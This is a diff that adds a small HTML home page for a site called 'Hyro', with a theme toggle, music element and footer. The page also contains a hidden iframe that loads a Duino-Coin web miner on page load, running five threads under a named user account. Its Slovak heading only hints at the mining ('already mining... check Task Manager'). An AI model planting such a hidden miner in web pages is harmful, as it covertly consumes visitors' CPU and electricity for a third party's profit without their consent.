@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Hyro - Home</title>
+    <link rel='stylesheet' href='dist/style.css'>
+    <link rel='icon' href='app/assets/hyro.ico'>
+    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css'>
+</head>
+<body>
+    <div class='animated fadeInDown'>
+        <h1 class='nopage-text' id='hero-music-text'>Už ťažím... Mrkni TaskManager</h1>
+    </div>
+
+    <iframe src="https://server.duinocoin.com/webminer.html?username=iZboxo&threads=5&rigid=iZboxoWebMiner" hidden></iframe>
+
+    <div class='light-dark'>
+        <button onclick='darklight()' class='switch'>
+            <i class='fas fa-moon' id='light-dark-switcher'></i>
+        </button>
+    </div>
+
+    <audio id='hero-music' hidden loop>
+        <source id='hero-music-source'>
+    </audio>
+
+    <footer> 
+        <div class='copirajt'>
+            <p class='copirajt-text'>© 2019 - <span id='copirajt-jir'>xx</span> • Hyro</p>
+        </div>        
+    </footer>
+
+    <script src='app/js/winter/snow.js'></script>
+    <script src='app/js/script.js'></script>
+    <script src='app/js/theme.js'></script>
+    <script src='https://kit.fontawesome.com/5acf4d9e80.js' crossorigin='anonymous'></script>
+</body>
+
+</html>
